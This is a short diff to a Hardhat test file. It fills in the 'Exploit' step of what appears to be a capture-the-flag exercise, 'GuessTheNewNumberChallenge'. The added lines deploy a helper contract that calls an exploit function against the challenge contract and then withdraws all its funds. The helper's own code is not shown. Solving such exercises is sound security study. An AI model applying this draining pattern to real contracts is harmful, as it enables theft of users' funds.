@@ -10,6 +10,9 @@ describe("GuessTheNewNumberChallenge", async function () {
 
     it("Exploit", async function () {
         // WRITE YOUR CODE HERE
+        const helper = await (await ethers.getContractFactory("GuessTheNewNumberHelper")).deploy();
+        await helper.exploit(contract.address, { value: ethers.utils.parseEther("1") });
+        await helper.withdrawAllFunds();
     });
 
     after(async function () {
